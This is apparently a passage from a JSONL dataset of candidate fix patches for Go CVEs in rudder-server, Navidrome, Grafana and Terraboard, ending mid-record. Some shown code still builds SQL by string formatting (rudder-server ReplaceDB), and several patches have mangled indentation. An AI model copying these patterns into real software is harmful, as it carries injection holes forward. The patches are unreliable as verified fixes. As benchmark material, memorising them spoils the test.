misc\n+\n+import (\n+\"database/sql\"\n+\"fmt\"\n+\"os\"\n+\n+\"github.com/lib/pq\"\n+\n+\"github.com/rudderlabs/rudder-server/config\"\n+)\n+\n+// GetConnectionString Returns Jobs DB connection configuration\n+func GetConnectionString() string {\n+host := config.GetString(\"DB.host\", \"localhost\")\n+user := config.GetString(\"DB.user\", \"ubuntu\")\n+dbname := config.GetString(\"DB.name\", \"ubuntu\")\n+port := config.GetInt(\"DB.port\", 5432)\n+password := config.GetString(\"DB.password\", \"ubuntu\") // Reading secrets from\n+sslmode := config.GetString(\"DB.sslMode\", \"disable\")\n+// Application Name can be any string of less than NAMEDATALEN characters (64 characters in a standard PostgreSQL build).\n+// There is no need to truncate the string on our own though since PostgreSQL auto-truncates this identifier and issues a relevant notice if necessary.\n+appName := DefaultString(\"rudder-server\").OnError(os.Hostname())\n+return fmt.Sprintf(\"host=%s port=%d user=%s \"+\n+\"password=%s dbname=%s sslmode=%s application_name=%s\",\n+host, port, user, password, dbname, sslmode, appName)\n+}\n+\n+/*\n+ReplaceDB : Rename the OLD DB and create a new one.\n+Since we are not journaling, this should be idemponent\n+*/\n+func ReplaceDB(dbName, targetName string) {\n+host := config.GetString(\"DB.host\", \"localhost\")\n+user := config.GetString(\"DB.user\", \"ubuntu\")\n+port := config.GetInt(\"DB.port\", 5432)\n+password := config.GetString(\"DB.password\", \"ubuntu\") // Reading secrets from\n+sslmode := config.GetString(\"DB.sslMode\", \"disable\")\n+connInfo := fmt.Sprintf(\"host=%s port=%d user=%s password=%s dbname=postgres sslmode=%s\",\n+host, port, user, password, sslmode)\n+db, err := sql.Open(\"postgres\", connInfo)\n+if err != nil {\n+panic(err)\n+}\n+defer db.Close()\n+\n+// Killing sessions on the db\n+sqlStatement := fmt.Sprintf(\"SELECT pid, pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname = '%s' AND pid <> pg_backend_pid();\", dbName)\n+rows, err := db.Query(sqlStatement)\n+if err != nil {\n+panic(err)\n+}\n+rows.Close()\n+\n+renameDBStatement := fmt.Sprintf(`ALTER DATABASE %q RENAME TO %q`,\n+dbName, targetName)\n+_, err = db.Exec(renameDBStatement)\n+\n+// If execution of ALTER returns error, pacicking\n+if err != nil {\n+panic(err)\n+}\n+\n+createDBStatement := fmt.Sprintf(`CREATE DATABASE %q`, dbName)\n+_, err = db.Exec(createDBStatement)\n+if err != nil {\n+panic(err)\n+}\n+}\n+\n+func QuoteLiteral(literal string) string {\n+return pq.QuoteLiteral(literal)\n+}\n+\n+func QuoteIdentifier(name string) string {\n+return pq.QuoteIdentifier(name)\n+}\ndiff --git a/utils/misc/dbutils.go b/utils/misc/dbutils.go\nindex 93dc899e..6a93f61e 100644\n--- a/utils/misc/dbutils.go\n+++ b/utils/misc/dbutils.go\n@@ -1,29 +1,29 @@\n package misc\n \n import (\n-\t\"database/sql\"\n-\t\"fmt\"\n-\t\"os\"\n+\"database/sql\"\n+\"fmt\"\n+\"os\"\n \n-\t\"github.com/lib/pq\"\n+\"github.com/lib/pq\"\n \n-\t\"github.com/rudderlabs/rudder-server/config\"\n+\"github.com/rudderlabs/rudder-server/config\"\n )\n \n // GetConnectionString Returns Jobs DB connection configuration\n func GetConnectionString() string {\n-\thost := config.GetString(\"DB.host\", \"localhost\")\n-\tuser := config.GetString(\"DB.user\", \"ubuntu\")\n-\tdbname := config.GetString(\"DB.name\", \"ubuntu\")\n-\tport := config.GetInt(\"DB.port\", 5432)\n-\tpassword := config.GetString(\"DB.password\", \"ubuntu\") // Reading secrets from\n-\tsslmode := config.GetString(\"DB.sslMode\", \"disable\")\n-\t// Application Name can be any string of less than NAMEDATALEN characters (64 characters in a standard PostgreSQL build).\n-\t// There is no need to truncate the string on our own though since PostgreSQL auto-truncates this identifier and issues a relevant notice if necessary.\n-\tappName := DefaultString(\"rudder-server\").OnError(os.Hostname())\n-\treturn fmt.Sprintf(\"host=%s port=%d user=%s \"+\n-\t\t\"password=%s dbname=%s sslmode=%s application_name=%s\",\n-\t\thost, port, user, password, dbname, sslmode, appName)\n+host := config.GetString(\"DB.host\", \"localhost\")\n+user := config.GetString(\"DB.user\", \"ubuntu\")\n+dbname := config.GetString(\"DB.name\", \"ubuntu\")\n+port := config.GetInt(\"DB.port\", 5432)\n+password := config.GetString(\"DB.password\", \"ubuntu\") // Reading secrets from\n+sslmode := config.GetString(\"DB.sslMode\", \"disable\")\n+// Application Name can be any string of less than NAMEDATALEN characters (64 characters in a standard PostgreSQL build).\n+// There is no need to truncate the string on our own though since PostgreSQL auto-truncates this identifier and issues a relevant notice if necessary.\n+appName := DefaultString(\"rudder-server\").OnError(os.Hostname())\n+return fmt.Sprintf(\"host=%s port=%d user=%s \"+\n+\"password=%s dbname=%s sslmode=%s application_name=%s\",\n+host, port, user, password, dbname, sslmode, appName)\n }\n \n /*\n@@ -31,44 +31,47 @@ ReplaceDB : Rename the OLD DB and create a new one.\n Since we are not journaling, this should be idemponent\n */\n func ReplaceDB(dbName, targetName string) {\n-\thost := config.GetString(\"DB.host\", \"localhost\")\n-\tuser := config.GetString(\"DB.user\", \"ubuntu\")\n-\tport := config.GetInt(\"DB.port\", 5432)\n-\tpassword := config.GetString(\"DB.password\", \"ubuntu\") // Reading secrets from\n-\tsslmode := config.GetString(\"DB.sslMode\", \"disable\")\n-\tconnInfo := fmt.Sprintf(\"host=%s port=%d user=%s password=%s dbname=postgres sslmode=%s\",\n-\t\thost, port, user, password, sslmode)\n-\tdb, err := sql.Open(\"postgres\", connInfo)\n-\tif err != nil {\n-\t\tpanic(err)\n-\t}\n-\tdefer db.Close()\n+host := config.GetString(\"DB.host\", \"localhost\")\n+user := config.GetString(\"DB.user\", \"ubuntu\")\n+port := config.GetInt(\"DB.port\", 5432)\n+password := config.GetString(\"DB.password\", \"ubuntu\") // Reading secrets from\n+sslmode := config.GetString(\"DB.sslMode\", \"disable\")\n+connInfo := fmt.Sprintf(\"host=%s port=%d user=%s password=%s dbname=postgres sslmode=%s\",\n+host, port, user, password, sslmode)\n+db, err := sql.Open(\"postgres\", connInfo)\n+if err != nil {\n+panic(err)\n+}\n+defer db.Close()\n \n-\t// Killing sessions on the db\n-\tsqlStatement := fmt.Sprintf(\"SELECT pid, pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname = '%s' AND pid <> pg_backend_pid();\", dbName)\n-\trows, err := db.Query(sqlStatement)\n-\tif err != nil {\n-\t\tpanic(err)\n-\t}\n-\trows.Close()\n+// Killing sessions on the db\n+sqlStatement := fmt.Sprintf(\"SELECT pid, pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname = '%s' AND pid <> pg_backend_pid();\", dbName)\n+rows, err := db.Query(sqlStatement)\n+if err != nil {\n+panic(err)\n+}\n+rows.Close()\n \n-\trenameDBStatement := fmt.Sprintf(`ALTER DATABASE %q RENAME TO %q`,\n-\t\tdbName, targetName)\n-\tpkgLogger.Debug(renameDBStatement)\n-\t_, err = db.Exec(renameDBStatement)\n+renameDBStatement := fmt.Sprintf(`ALTER DATABASE %q RENAME TO %q`,\n+dbName, targetName)\n+_, err = db.Exec(renameDBStatement)\n \n-\t// If execution of ALTER returns error, pacicking\n-\tif err != nil {\n-\t\tpanic(err)\n-\t}\n+// If execution of ALTER returns error, pacicking\n+if err != nil {\n+panic(err)\n+}\n \n-\tcreateDBStatement := fmt.Sprintf(`CREATE DATABASE %q`, dbName)\n-\t_, err = db.Exec(createDBStatement)\n-\tif err != nil {\n-\t\tpanic(err)\n-\t}\n+createDBStatement := fmt.Sprintf(`CREATE DATABASE %q`, dbName)\n+_, err = db.Exec(createDBStatement)\n+if err != nil {\n+panic(err)\n+}\n }\n \n func QuoteLiteral(literal string) string {\n-\treturn pq.QuoteLiteral(literal)\n+return pq.QuoteLiteral(literal)\n+}\n+\n+func QuoteIdentifier(name string) string {\n+return pq.QuoteIdentifier(name)\n }\n"}
{"cve":"CVE-2022-23857:0708", "fix_patch": "diff --git a/model/criteria/criteria.go b/model/criteria/criteria.go\nindex 0d3c7295..7e27c3e3 100644\n--- a/model/criteria/criteria.go\n+++ b/model/criteria/criteria.go\n@@ -2,98 +2,105 @@\n package criteria\n \n import (\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"strings\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"strings\"\n \n-\t\"github.com/navidrome/navidrome/log\"\n+        \"github.com/navidrome/navidrome/log\"\n \n-\t\"github.com/Masterminds/squirrel\"\n+        \"github.com/Masterminds/squirrel\"\n )\n \n type Expression = squirrel.Sqlizer\n \n type Criteria struct {\n-\tExpression\n-\tSort   string\n-\tOrder  string\n-\tLimit  int\n-\tOffset int\n+        Expression\n+        Sort   string\n+        Order  string\n+        Limit  int\n+        Offset int\n }\n \n func (c Criteria) OrderBy() string {\n-\tif c.Sort == \"\" {\n-\t\tc.Sort = \"title\"\n-\t}\n-\tf := fieldMap[strings.ToLower(c.Sort)]\n-\tvar mapped string\n-\tif f == nil {\n-\t\tlog.Error(\"Invalid field in 'sort' field\", \"field\", c.Sort)\n-\t\tmapped = c.Sort\n-\t} else {\n-\t\tif f.order == \"\" {\n-\t\t\tmapped = f.field\n-\t\t} else {\n-\t\t\tmapped = f.order\n-\t\t}\n-\t}\n-\tif c.Order != \"\" {\n-\t\tmapped = mapped + \" \" + c.Order\n-\t}\n-\treturn mapped\n+        if c.Sort == \"\" {\n+                c.Sort = \"title\"\n+        }\n+f := fieldMap[strings.ToLower(c.Sort)]\n+if f == nil {\n+log.Error(\"Invalid field in 'sort' field\", \"field\", c.Sort)\n+c.Sort = \"title\"\n+f = fieldMap[c.Sort]\n+}\n+\n+var mapped string\n+if f.order == \"\" {\n+mapped = f.field\n+} else {\n+mapped = f.order\n+}\n+\n+if c.Order != \"\" {\n+order := strings.ToLower(c.Order)\n+if order != \"asc\" && order != \"desc\" {\n+log.Errorw(\"Invalid order\", \"order\", c.Order)\n+} else {\n+mapped = mapped + \" \" + c.Order\n+}\n+}\n+        return mapped\n }\n \n func (c Criteria) ToSql() (sql string, args []interface{}, err error) {\n-\treturn c.Expression.ToSql()\n+        return c.Expression.ToSql()\n }\n \n func (c Criteria) MarshalJSON() ([]byte, error) {\n-\taux := struct {\n-\t\tAll    []Expression `json:\"all,omitempty\"`\n-\t\tAny    []Expression `json:\"any,omitempty\"`\n-\t\tSort   string       `json:\"sort,omitempty\"`\n-\t\tOrder  string       `json:\"order,omitempty\"`\n-\t\tLimit  int          `json:\"limit,omitempty\"`\n-\t\tOffset int          `json:\"offset,omitempty\"`\n-\t}{\n-\t\tSort:   c.Sort,\n-\t\tOrder:  c.Order,\n-\t\tLimit:  c.Limit,\n-\t\tOffset: c.Offset,\n-\t}\n-\tswitch rules := c.Expression.(type) {\n-\tcase Any:\n-\t\taux.Any = rules\n-\tcase All:\n-\t\taux.All = rules\n-\tdefault:\n-\t\taux.All = All{rules}\n-\t}\n-\treturn json.Marshal(aux)\n+        aux := struct {\n+                All    []Expression `json:\"all,omitempty\"`\n+                Any    []Expression `json:\"any,omitempty\"`\n+                Sort   string       `json:\"sort,omitempty\"`\n+                Order  string       `json:\"order,omitempty\"`\n+                Limit  int          `json:\"limit,omitempty\"`\n+                Offset int          `json:\"offset,omitempty\"`\n+        }{\n+                Sort:   c.Sort,\n+                Order:  c.Order,\n+                Limit:  c.Limit,\n+                Offset: c.Offset,\n+        }\n+        switch rules := c.Expression.(type) {\n+        case Any:\n+                aux.Any = rules\n+        case All:\n+                aux.All = rules\n+        default:\n+                aux.All = All{rules}\n+        }\n+        return json.Marshal(aux)\n }\n \n func (c *Criteria) UnmarshalJSON(data []byte) error {\n-\tvar aux struct {\n-\t\tAll    unmarshalConjunctionType `json:\"all\"`\n-\t\tAny    unmarshalConjunctionType `json:\"any\"`\n-\t\tSort   string                   `json:\"sort\"`\n-\t\tOrder  string                   `json:\"order\"`\n-\t\tLimit  int                      `json:\"limit\"`\n-\t\tOffset int                      `json:\"offset\"`\n-\t}\n-\tif err := json.Unmarshal(data, &aux); err != nil {\n-\t\treturn err\n-\t}\n-\tif len(aux.Any) > 0 {\n-\t\tc.Expression = Any(aux.Any)\n-\t} else if len(aux.All) > 0 {\n-\t\tc.Expression = All(aux.All)\n-\t} else {\n-\t\treturn errors.New(\"invalid criteria json. missing rules (key 'all' or 'any')\")\n-\t}\n-\tc.Sort = aux.Sort\n-\tc.Order = aux.Order\n-\tc.Limit = aux.Limit\n-\tc.Offset = aux.Offset\n-\treturn nil\n+        var aux struct {\n+                All    unmarshalConjunctionType `json:\"all\"`\n+                Any    unmarshalConjunctionType `json:\"any\"`\n+                Sort   string                   `json:\"sort\"`\n+                Order  string                   `json:\"order\"`\n+                Limit  int                      `json:\"limit\"`\n+                Offset int                      `json:\"offset\"`\n+        }\n+        if err := json.Unmarshal(data, &aux); err != nil {\n+                return err\n+        }\n+        if len(aux.Any) > 0 {\n+                c.Expression = Any(aux.Any)\n+        } else if len(aux.All) > 0 {\n+                c.Expression = All(aux.All)\n+        } else {\n+                return errors.New(\"invalid criteria json. missing rules (key 'all' or 'any')\")\n+        }\n+        c.Sort = aux.Sort\n+        c.Order = aux.Order\n+        c.Limit = aux.Limit\n+        c.Offset = aux.Offset\n+        return nil\n }\n"}
{"cve":"CVE-2019-19499:0708", "fix_patch": "diff --git a/pkg/tsdb/mysql/mysql.go b/pkg/tsdb/mysql/mysql.go\nindex fe41a9f38b5..62db502d8b2 100644\n--- a/pkg/tsdb/mysql/mysql.go\n+++ b/pkg/tsdb/mysql/mysql.go\n@@ -1,148 +1,155 @@\n package mysql\n \n import (\n-\t\"database/sql\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"reflect\"\n-\t\"strconv\"\n-\t\"strings\"\n-\n-\t\"github.com/VividCortex/mysqlerr\"\n-\n-\t\"github.com/grafana/grafana/pkg/setting\"\n-\n-\t\"github.com/go-sql-driver/mysql\"\n-\t\"github.com/go-xorm/core\"\n-\t\"github.com/grafana/grafana/pkg/infra/log\"\n-\t\"github.com/grafana/grafana/pkg/models\"\n-\t\"github.com/grafana/grafana/pkg/tsdb\"\n-\t\"github.com/grafana/grafana/pkg/tsdb/sqleng\"\n+        \"database/sql\"\n+        \"errors\"\n+        \"fmt\"\n+        \"reflect\"\n+        \"strconv\"\n+        \"strings\"\n+\n+        \"github.com/VividCortex/mysqlerr\"\n+\n+        \"github.com/grafana/grafana/pkg/setting\"\n+\n+        \"github.com/go-sql-driver/mysql\"\n+        \"github.com/go-xorm/core\"\n+        \"github.com/grafana/grafana/pkg/infra/log\"\n+        \"github.com/grafana/grafana/pkg/models\"\n+        \"github.com/grafana/grafana/pkg/tsdb\"\n+        \"github.com/grafana/grafana/pkg/tsdb/sqleng\"\n )\n \n func init() {\n-\ttsdb.RegisterTsdbQueryEndpoint(\"mysql\", newMysqlQueryEndpoint)\n+        tsdb.RegisterTsdbQueryEndpoint(\"mysql\", newMysqlQueryEndpoint)\n }\n \n func newMysqlQueryEndpoint(datasource *models.DataSource) (tsdb.TsdbQueryEndpoint, error) {\n-\tlogger := log.New(\"tsdb.mysql\")\n-\n-\tprotocol := \"tcp\"\n-\tif strings.HasPrefix(datasource.Url, \"/\") {\n-\t\tprotocol = \"unix\"\n-\t}\n-\tcnnstr := fmt.Sprintf(\"%s:%s@%s(%s)/%s?collation=utf8mb4_unicode_ci&parseTime=true&loc=UTC&allowNativePasswords=true\",\n-\t\tdatasource.User,\n-\t\tdatasource.DecryptedPassword(),\n-\t\tprotocol,\n-\t\tdatasource.Url,\n-\t\tdatasource.Database,\n-\t)\n-\n-\ttlsConfig, err := datasource.GetTLSConfig()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif tlsConfig.RootCAs != nil || len(tlsConfig.Certificates) > 0 {\n-\t\ttlsConfigString := fmt.Sprintf(\"ds%d\", datasource.Id)\n-\t\tif err := mysql.RegisterTLSConfig(tlsConfigString, tlsConfig); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tcnnstr += \"&tls=\" + tlsConfigString\n-\t}\n-\n-\tif setting.Env == setting.DEV {\n-\t\tlogger.Debug(\"getEngine\", \"connection\", cnnstr)\n-\t}\n-\n-\tconfig := sqleng.SqlQueryEndpointConfiguration{\n-\t\tDriverName:        \"mysql\",\n-\t\tConnectionString:  cnnstr,\n-\t\tDatasource:        datasource,\n-\t\tTimeColumnNames:   []string{\"time\", \"time_sec\"},\n-\t\tMetricColumnTypes: []string{\"CHAR\", \"VARCHAR\", \"TINYTEXT\", \"TEXT\", \"MEDIUMTEXT\", \"LONGTEXT\"},\n-\t}\n-\n-\trowTransformer := mysqlQueryResultTransformer{\n-\t\tlog: logger,\n-\t}\n-\n-\treturn sqleng.NewSqlQueryEndpoint(&config, &rowTransformer, newMysqlMacroEngine(logger), logger)\n+        logger := log.New(\"tsdb.mysql\")\n+\n+        protocol := \"tcp\"\n+        if strings.HasPrefix(datasource.Url, \"/\") {\n+                protocol = \"unix\"\n+        }\n+\n+        cfg := mysql.Config{\n+                User:                  datasource.User,\n+                Passwd:                datasource.DecryptedPassword(),\n+                Net:                   protocol,\n+                Addr:                  datasource.Url,\n+                DBName:                datasource.Database,\n+                AllowNativePasswords:  true,\n+                ParseTime:             true,\n+                Collation:             \"utf8mb4_unicode_ci\",\n+                Params:                map[string]string{\"loc\": \"UTC\"},\n+        }\n+\n+        tlsConfig, err := datasource.GetTLSConfig()\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        if tlsConfig.RootCAs != nil || len(tlsConfig.Certificates) > 0 {\n+                tlsConfigString := fmt.Sprintf(\"ds%d\", datasource.Id)\n+                if err := mysql.RegisterTLSConfig(tlsConfigString, tlsConfig); err != nil {\n+                        return nil, err\n+                }\n+                cfg.TLSConfig = tlsConfigString\n+        }\n+\n+        cnnstr := cfg.FormatDSN()\n+\n+        if setting.Env == setting.DEV {\n+                logger.Debug(\"getEngine\", \"connection\", cnnstr)\n+        }\n+\n+        config := sqleng.SqlQueryEndpointConfiguration{\n+                DriverName:        \"mysql\",\n+                ConnectionString:  cnnstr,\n+                Datasource:        datasource,\n+                TimeColumnNames:   []string{\"time\", \"time_sec\"},\n+                MetricColumnTypes: []string{\"CHAR\", \"VARCHAR\", \"TINYTEXT\", \"TEXT\", \"MEDIUMTEXT\", \"LONGTEXT\"},\n+        }\n+\n+        rowTransformer := mysqlQueryResultTransformer{\n+                log: logger,\n+        }\n+\n+        return sqleng.NewSqlQueryEndpoint(&config, &rowTransformer, newMysqlMacroEngine(logger), logger)\n }\n \n type mysqlQueryResultTransformer struct {\n-\tlog log.Logger\n+        log log.Logger\n }\n \n func (t *mysqlQueryResultTransformer) TransformQueryResult(columnTypes []*sql.ColumnType, rows *core.Rows) (tsdb.RowValues, error) {\n-\tvalues := make([]interface{}, len(columnTypes))\n-\n-\tfor i := range values {\n-\t\tscanType := columnTypes[i].ScanType()\n-\t\tvalues[i] = reflect.New(scanType).Interface()\n-\n-\t\tif columnTypes[i].DatabaseTypeName() == \"BIT\" {\n-\t\t\tvalues[i] = new([]byte)\n-\t\t}\n-\t}\n-\n-\tif err := rows.Scan(values...); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfor i := 0; i < len(columnTypes); i++ {\n-\t\ttypeName := reflect.ValueOf(values[i]).Type().String()\n-\n-\t\tswitch typeName {\n-\t\tcase \"*sql.RawBytes\":\n-\t\t\tvalues[i] = string(*values[i].(*sql.RawBytes))\n-\t\tcase \"*mysql.NullTime\":\n-\t\t\tsqlTime := (*values[i].(*mysql.NullTime))\n-\t\t\tif sqlTime.Valid {\n-\t\t\t\tvalues[i] = sqlTime.Time\n-\t\t\t} else {\n-\t\t\t\tvalues[i] = nil\n-\t\t\t}\n-\t\tcase \"*sql.NullInt64\":\n-\t\t\tnullInt64 := (*values[i].(*sql.NullInt64))\n-\t\t\tif nullInt64.Valid {\n-\t\t\t\tvalues[i] = nullInt64.Int64\n-\t\t\t} else {\n-\t\t\t\tvalues[i] = nil\n-\t\t\t}\n-\t\tcase \"*sql.NullFloat64\":\n-\t\t\tnullFloat64 := (*values[i].(*sql.NullFloat64))\n-\t\t\tif nullFloat64.Valid {\n-\t\t\t\tvalues[i] = nullFloat64.Float64\n-\t\t\t} else {\n-\t\t\t\tvalues[i] = nil\n-\t\t\t}\n-\t\t}\n-\n-\t\tif columnTypes[i].DatabaseTypeName() == \"DECIMAL\" {\n-\t\t\tf, err := strconv.ParseFloat(values[i].(string), 64)\n-\n-\t\t\tif err == nil {\n-\t\t\t\tvalues[i] = f\n-\t\t\t} else {\n-\t\t\t\tvalues[i] = nil\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn values, nil\n+        values := make([]interface{}, len(columnTypes))\n+\n+        for i := range values {\n+                scanType := columnTypes[i].ScanType()\n+                values[i] = reflect.New(scanType).Interface()\n+\n+                if columnTypes[i].DatabaseTypeName() == \"BIT\" {\n+                        values[i] = new([]byte)\n+                }\n+        }\n+\n+        if err := rows.Scan(values...); err != nil {\n+                return nil, err\n+        }\n+\n+        for i := 0; i < len(columnTypes); i++ {\n+                typeName := reflect.ValueOf(values[i]).Type().String()\n+\n+                switch typeName {\n+                case \"*sql.RawBytes\":\n+                        values[i] = string(*values[i].(*sql.RawBytes))\n+                case \"*mysql.NullTime\":\n+                        sqlTime := (*values[i].(*mysql.NullTime))\n+                        if sqlTime.Valid {\n+                                values[i] = sqlTime.Time\n+                        } else {\n+                                values[i] = nil\n+                        }\n+                case \"*sql.NullInt64\":\n+                        nullInt64 := (*values[i].(*sql.NullInt64))\n+                        if nullInt64.Valid {\n+                                values[i] = nullInt64.Int64\n+                        } else {\n+                                values[i] = nil\n+                        }\n+                case \"*sql.NullFloat64\":\n+                        nullFloat64 := (*values[i].(*sql.NullFloat64))\n+                        if nullFloat64.Valid {\n+                                values[i] = nullFloat64.Float64\n+                        } else {\n+                                values[i] = nil\n+                        }\n+                }\n+\n+                if columnTypes[i].DatabaseTypeName() == \"DECIMAL\" {\n+                        f, err := strconv.ParseFloat(values[i].(string), 64)\n+\n+                        if err == nil {\n+                                values[i] = f\n+                        } else {\n+                                values[i] = nil\n+                        }\n+                }\n+        }\n+\n+        return values, nil\n }\n \n func (t *mysqlQueryResultTransformer) TransformQueryError(err error) error {\n-\tif driverErr, ok := err.(*mysql.MySQLError); ok {\n-\t\tif driverErr.Number != mysqlerr.ER_PARSE_ERROR && driverErr.Number != mysqlerr.ER_BAD_FIELD_ERROR && driverErr.Number != mysqlerr.ER_NO_SUCH_TABLE {\n-\t\t\tt.log.Error(\"query error\", \"err\", err)\n-\t\t\treturn errQueryFailed\n-\t\t}\n-\t}\n-\n-\treturn err\n+        if driverErr, ok := err.(*mysql.MySQLError); ok {\n+                if driverErr.Number != mysqlerr.ER_PARSE_ERROR && driverErr.Number != mysqlerr.ER_BAD_FIELD_ERROR && driverErr.Number != mysqlerr.ER_NO_SUCH_TABLE {\n+                        t.log.Error(\"query error\", \"err\", err)\n+                        return errQueryFailed\n+                }\n+        }\n+\n+        return err\n }\n \n var errQueryFailed = errors.New(\"Query failed. Please inspect Grafana server log for details\")\n"}
{"cve":"CVE-2022-1883:0708", "fix_patch": "diff --git a/db/db.go b/db/db.go\nindex 88e5390..c866679 100644\n--- a/db/db.go\n+++ b/db/db.go\n@@ -1,432 +1,434 @@\n package db\n \n import (\n-\t\"database/sql\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"net/url\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\n-\t\"github.com/camptocamp/terraboard/config\"\n-\t\"github.com/camptocamp/terraboard/internal/terraform/addrs\"\n-\t\"github.com/camptocamp/terraboard/internal/terraform/states\"\n-\t\"github.com/camptocamp/terraboard/internal/terraform/states/statefile\"\n-\t\"github.com/camptocamp/terraboard/state\"\n-\t\"github.com/camptocamp/terraboard/types\"\n-\tlog \"github.com/sirupsen/logrus\"\n-\n-\tctyJson \"github.com/zclconf/go-cty/cty/json\"\n-\t\"gorm.io/driver/postgres\"\n-\t\"gorm.io/gorm\"\n-\t\"gorm.io/gorm/logger\"\n+        \"database/sql\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"net/url\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+\n+        \"github.com/camptocamp/terraboard/config\"\n+        \"github.com/camptocamp/terraboard/internal/terraform/addrs\"\n+        \"github.com/camptocamp/terraboard/internal/terraform/states\"\n+        \"github.com/camptocamp/terraboard/internal/terraform/states/statefile\"\n+        \"github.com/camptocamp/terraboard/state\"\n+        \"github.com/camptocamp/terraboard/types\"\n+        log \"github.com/sirupsen/logrus\"\n+\n+        ctyJson \"github.com/zclconf/go-cty/cty/json\"\n+        \"gorm.io/driver/postgres\"\n+        \"gorm.io/gorm\"\n+        \"gorm.io/gorm/logger\"\n )\n \n // Database is a wrapping structure to *gorm.DB\n type Database struct {\n-\t*gorm.DB\n-\tlock sync.Mutex\n+        *gorm.DB\n+        lock sync.Mutex\n }\n \n var pageSize = 20\n \n // Init setups up the Database and a pointer to it\n func Init(config config.DBConfig, debug bool) *Database {\n-\tvar err error\n-\tconnString := fmt.Sprintf(\n-\t\t\"host=%s port=%d user=%s dbname=%s sslmode=%s password=%s\",\n-\t\tconfig.Host,\n-\t\tconfig.Port,\n-\t\tconfig.User,\n-\t\tconfig.Name,\n-\t\tconfig.SSLMode,\n-\t\tconfig.Password,\n-\t)\n-\tdb, err := gorm.Open(postgres.Open(connString), &gorm.Config{\n-\t\tLogger: &LogrusGormLogger,\n-\t})\n-\tif err != nil {\n-\t\tlog.Fatal(err)\n-\t}\n-\n-\tlog.Infof(\"Automigrate\")\n-\terr = db.AutoMigrate(\n-\t\t&types.Lineage{},\n-\t\t&types.Version{},\n-\t\t&types.State{},\n-\t\t&types.Module{},\n-\t\t&types.Resource{},\n-\t\t&types.Attribute{},\n-\t\t&types.OutputValue{},\n-\t\t&types.Plan{},\n-\t\t&types.PlanModel{},\n-\t\t&types.PlanModelVariable{},\n-\t\t&types.PlanOutput{},\n-\t\t&types.PlanResourceChange{},\n-\t\t&types.PlanState{},\n-\t\t&types.PlanStateModule{},\n-\t\t&types.PlanStateOutput{},\n-\t\t&types.PlanStateResource{},\n-\t\t&types.PlanStateResourceAttribute{},\n-\t\t&types.PlanStateValue{},\n-\t\t&types.Change{},\n-\t)\n-\tif err != nil {\n-\t\tlog.Fatalf(\"Migration failed: %v\\n\", err)\n-\t}\n-\n-\tif debug {\n-\t\tdb.Config.Logger.LogMode(logger.Info)\n-\t}\n-\n-\td := &Database{DB: db}\n-\tif err = d.MigrateLineage(); err != nil {\n-\t\tlog.Fatalf(\"Lineage migration failed: %v\\n\", err)\n-\t}\n-\n-\treturn d\n+        var err error\n+        connString := fmt.Sprintf(\n+                \"host=%s port=%d user=%s dbname=%s sslmode=%s password=%s\",\n+                config.Host,\n+                config.Port,\n+                config.User,\n+                config.Name,\n+                config.SSLMode,\n+                config.Password,\n+        )\n+        db, err := gorm.Open(postgres.Open(connString), &gorm.Config{\n+                Logger: &LogrusGormLogger,\n+        })\n+        if err != nil {\n+                log.Fatal(err)\n+        }\n+\n+        log.Infof(\"Automigrate\")\n+        err = db.AutoMigrate(\n+                &types.Lineage{},\n+                &types.Version{},\n+                &types.State{},\n+                &types.Module{},\n+                &types.Resource{},\n+                &types.Attribute{},\n+                &types.OutputValue{},\n+                &types.Plan{},\n+                &types.PlanModel{},\n+                &types.PlanModelVariable{},\n+                &types.PlanOutput{},\n+                &types.PlanResourceChange{},\n+                &types.PlanState{},\n+                &types.PlanStateModule{},\n+                &types.PlanStateOutput{},\n+                &types.PlanStateResource{},\n+                &types.PlanStateResourceAttribute{},\n+                &types.PlanStateValue{},\n+                &types.Change{},\n+        )\n+        if err != nil {\n+                log.Fatalf(\"Migration failed: %v\\n\", err)\n+        }\n+\n+        if debug {\n+                db.Config.Logger.LogMode(logger.Info)\n+        }\n+\n+        d := &Database{DB: db}\n+        if err = d.MigrateLineage(); err != nil {\n+                log.Fatalf(\"Lineage migration failed: %v\\n\", err)\n+        }\n+\n+        return d\n }\n \n // MigrateLineage is a migration function to update db and its data to the\n // new lineage db scheme. It will update State table data, delete \"lineage\" column\n // and add corresponding Lineage entries\n func (db *Database) MigrateLineage() error {\n-\tif db.Migrator().HasColumn(&types.State{}, \"lineage\") {\n-\t\tvar states []types.State\n-\t\tif err := db.Find(&states).Error; err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tfor _, st := range states {\n-\t\t\tif err := db.UpdateState(st); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"Failed to update %s state during lineage migration: %v\", st.Path, err)\n-\t\t\t}\n-\t\t}\n-\n-\t\t// Custom migration rules\n-\t\tif err := db.Migrator().DropColumn(&types.State{}, \"lineage\"); err != nil {\n-\t\t\treturn fmt.Errorf(\"Failed to drop lineage column during migration: %v\", err)\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        if db.Migrator().HasColumn(&types.State{}, \"lineage\") {\n+                var states []types.State\n+                if err := db.Find(&states).Error; err != nil {\n+                        return err\n+                }\n+\n+                for _, st := range states {\n+                        if err := db.UpdateState(st); err != nil {\n+                                return fmt.Errorf(\"Failed to update %s state during lineage migration: %v\", st.Path, err)\n+                        }\n+                }\n+\n+                // Custom migration rules\n+                if err := db.Migrator().DropColumn(&types.State{}, \"lineage\"); err != nil {\n+                        return fmt.Errorf(\"Failed to drop lineage column during migration: %v\", err)\n+                }\n+        }\n+\n+        return nil\n }\n \n type attributeValues map[string]interface{}\n \n func (db *Database) stateS3toDB(sf *statefile.File, path string, versionID string) (st types.State, err error) {\n-\tvar version types.Version\n-\tdb.First(&version, 